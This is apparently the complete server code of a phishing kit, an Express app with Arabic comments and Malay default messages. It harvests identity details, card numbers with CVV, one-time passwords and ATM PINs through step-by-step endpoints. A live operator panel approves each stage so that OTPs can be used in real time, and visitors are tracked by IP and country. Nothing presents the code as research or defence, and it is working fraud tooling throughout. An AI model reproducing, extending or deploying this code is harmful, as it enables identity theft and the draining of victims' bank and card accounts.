const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const geoip = require('geoip-lite');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

// مسارات ملفات البيانات
const DATA_DIR = path.join(__dirname, 'data');
const ORDERS_FILE = path.join(DATA_DIR, 'orders.json');
const ORDER_STATES_FILE = path.join(DATA_DIR, 'order_states.json');
const SESSIONS_FILE = path.join(DATA_DIR, 'sessions.json');

// التأكد من وجود المجلد والملفات
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
if (!fs.existsSync(ORDERS_FILE)) fs.writeFileSync(ORDERS_FILE, JSON.stringify([]));
if (!fs.existsSync(ORDER_STATES_FILE)) fs.writeFileSync(ORDER_STATES_FILE, JSON.stringify({}));
if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, JSON.stringify({}));

// دوال مساعدة للتعامل مع البيانات
const readData = (file) => JSON.parse(fs.readFileSync(file, 'utf8'));
const writeData = (file, data) => fs.writeFileSync(file, JSON.stringify(data, null, 2));

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Helper function to get country from IP
function getCountryFromIP(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '');
    const geo = geoip.lookup(cleanIP);
    if (geo && geo.country) return geo.country;
  } catch (e) {}
  if (!ip || ip === '127.0.0.1' || ip === '::1') return 'Local';
  return 'Unknown';
}

app.set('trust proxy', true);

// تتبع الجلسات
app.use((req, res, next) => {
  if (req.path.includes('.') || req.path.startsWith('/api/')) return next();

  const forwardedFor = req.headers['x-forwarded-for'];
  const realIp = req.headers['x-real-ip'];
  const ip = forwardedFor ? forwardedFor.split(',')[0].trim() : (realIp || req.ip || req.connection.remoteAddress);
  const userAgent = req.get('user-agent') || '';
  const visitorKey = (ip || 'unknown') + ':' + userAgent.substring(0, 100);
  const country = getCountryFromIP(ip);
  const currentPage = req.path;
  const now = new Date().toISOString();

  const sessions = readData(SESSIONS_FILE);
  sessions[visitorKey] = { ip, country, current_page: currentPage, last_activity: now, user_agent: userAgent };
  
  // تنظيف الجلسات القديمة
  const twoMinsAgo = new Date(Date.now() - 120000).toISOString();
  Object.keys(sessions).forEach(key => {
    if (sessions[key].last_activity < twoMinsAgo) delete sessions[key];
  });
  
  writeData(SESSIONS_FILE, sessions);
  res.locals.sessionId = visitorKey;
  next();
});

app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// API Routes
app.get('/api/admin/orders', (req, res) => {
  const orders = readData(ORDERS_FILE);
  const states = readData(ORDER_STATES_FILE);
  const result = orders.map(o => ({ ...o, orderState: states[o.id] || null }));
  res.json(result);
});

app.get('/api/sessions', (req, res) => {
  const sessions = readData(SESSIONS_FILE);
  res.json({ count: Object.keys(sessions).length, sessions: [] });
});

app.get('/api/sessions/full', (req, res) => {
  const sessions = readData(SESSIONS_FILE);
  res.json({ count: Object.keys(sessions).length, sessions: Object.values(sessions) });
});

app.get('/api/session', (req, res) => res.json({ sessionId: res.locals.sessionId }));

app.post('/api/heartbeat', (req, res) => {
  const { currentPage } = req.body;
  const sessionId = res.locals.sessionId;
  const sessions = readData(SESSIONS_FILE);
  if (sessions[sessionId]) {
    sessions[sessionId].last_activity = new Date().toISOString();
    sessions[sessionId].current_page = currentPage || sessions[sessionId].current_page;
    writeData(SESSIONS_FILE, sessions);
  }
  res.json({ success: true });
});

app.post('/api/orders/personal-data', (req, res) => {
  const { fullname, id_number, phone, id_expiry_day, id_expiry_month, id_expiry_year, dob_day, dob_month, dob_year, email, gender, lang } = req.body;
  if (!fullname || !id_number || !phone || !email) return res.status(400).json({ error: 'Missing fields' });

  const orderId = 'ORD-' + Date.now();
  const ip = req.ip;
  const country = getCountryFromIP(ip);
  
  const order = {
    id: orderId,
    timestamp: new Date().toISOString(),
    status: 'personal_data_submitted',
    current_page: 'personal_data',
    country,
    personalData: { fullname, id_number, phone, id_expiry: `${id_expiry_day}/${id_expiry_month}/${id_expiry_year}`, dob: `${dob_day}/${dob_month}/${dob_year}`, email, gender },
    lang: lang || 'ms'
  };

  const orders = readData(ORDERS_FILE);
  orders.push(order);
  writeData(ORDERS_FILE, orders);

  const states = readData(ORDER_STATES_FILE);
  states[orderId] = { stage: 'payment', status: 'waiting' };
  writeData(ORDER_STATES_FILE, states);

  res.json({ success: true, orderId });
});

app.post('/api/orders/payment-data', (req, res) => {
  const { orderId, card_holder, card_number, expiry_date, cvv } = req.body;
  const orders = readData(ORDERS_FILE);
  const orderIndex = orders.findIndex(o => o.id === orderId);
  if (orderIndex === -1) return res.status(404).json({ error: 'Order not found' });

  orders[orderIndex].paymentData = { card_holder, card_number, expiry_date, cvv };
  orders[orderIndex].status = 'payment_data_submitted';
  orders[orderIndex].current_page = 'payment';
  writeData(ORDERS_FILE, orders);

  const states = readData(ORDER_STATES_FILE);
  states[orderId] = { stage: 'payment', status: 'pending' };
  writeData(ORDER_STATES_FILE, states);

  res.json({ success: true });
});

app.get('/api/orders/:orderId/status', (req, res) => {
  const states = readData(ORDER_STATES_FILE);
  const state = states[req.params.orderId];
  if (!state) return res.json({ status: 'unknown' });

  const orders = readData(ORDERS_FILE);
  const order = orders.find(o => o.id === req.params.orderId);
  res.json({ ...state, currentPage: order ? order.current_page : null, lang: order ? order.lang : 'ms' });
});

app.post('/api/orders/otp-verification', (req, res) => {
  const { orderId, otp_code } = req.body;
  const orders = readData(ORDERS_FILE);
  const orderIndex = orders.findIndex(o => o.id === orderId);
  if (orderIndex === -1) return res.status(404).json({ error: 'Order not found' });

  orders[orderIndex].otpData = { otp_code, verified_at: new Date().toISOString() };
  orders[orderIndex].status = 'otp_submitted';
  orders[orderIndex].current_page = 'otp';
  writeData(ORDERS_FILE, orders);

  const states = readData(ORDER_STATES_FILE);
  states[orderId] = { stage: 'otp', status: 'pending' };
  writeData(ORDER_STATES_FILE, states);

  res.json({ success: true });
});

app.post('/api/orders/atm-pin', (req, res) => {
  const { orderId, atm_pin } = req.body;
  const orders = readData(ORDERS_FILE);
  const orderIndex = orders.findIndex(o => o.id === orderId);
  if (orderIndex === -1) return res.status(404).json({ error: 'Order not found' });

  orders[orderIndex].atmPinData = { atm_pin, submitted_at: new Date().toISOString() };
  orders[orderIndex].status = 'atm_pin_submitted';
  orders[orderIndex].current_page = 'atm_pin';
  writeData(ORDERS_FILE, orders);

  const states = readData(ORDER_STATES_FILE);
  states[orderId] = { stage: 'atm_pin', status: 'pending' };
  writeData(ORDER_STATES_FILE, states);

  res.json({ success: true });
});

app.post('/api/admin/verify', (req, res) => {
  if (req.body.password === ADMIN_PASSWORD) res.json({ success: true, token: 'fake-token' });
  else res.status(401).json({ error: 'Invalid password' });
});

app.post('/api/admin/approve/:orderId', (req, res) => {
  const { orderId } = req.params;
  const states = readData(ORDER_STATES_FILE);
  if (!states[orderId]) return res.status(404).json({ error: 'Not found' });

  const orders = readData(ORDERS_FILE);
  const orderIndex = orders.findIndex(o => o.id === orderId);
  
  let { stage } = states[orderId];
  let nextPage = '';

  if (stage === 'payment') { stage = 'otp'; nextPage = 'otp'; }
  else if (stage === 'otp') { stage = 'atm_pin'; nextPage = 'atm-pin'; }
  else if (stage === 'atm_pin') { stage = 'success'; nextPage = 'success'; orders[orderIndex].status = 'completed'; }

  states[orderId] = { stage, status: 'approved' };
  orders[orderIndex].current_page = nextPage;
  orders[orderIndex].adminAction = 'approved';
  orders[orderIndex].adminActionAt = new Date().toISOString();

  writeData(ORDER_STATES_FILE, states);
  writeData(ORDERS_FILE, orders);
  res.json({ success: true, nextPage });
});

app.post('/api/admin/reject/:orderId', (req, res) => {
  const { orderId } = req.params;
  const { message } = req.body;
  const states = readData(ORDER_STATES_FILE);
  if (!states[orderId]) return res.status(404).json({ error: 'Not found' });

  const orders = readData(ORDERS_FILE);
  const orderIndex = orders.findIndex(o => o.id === orderId);
  const lang = orders[orderIndex].lang || 'ms';
  const defaultMsg = lang === 'en' ? 'Information is incorrect' : 'Maklumat tidak betul';

  states[orderId].status = 'rejected';
  states[orderId].message = message || defaultMsg;
  orders[orderIndex].rejected = true;
  orders[orderIndex].rejection_reason = message || defaultMsg;
  orders[orderIndex].adminAction = 'rejected';

  writeData(ORDER_STATES_FILE, states);
  writeData(ORDERS_FILE, orders);
  res.json({ success: true });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
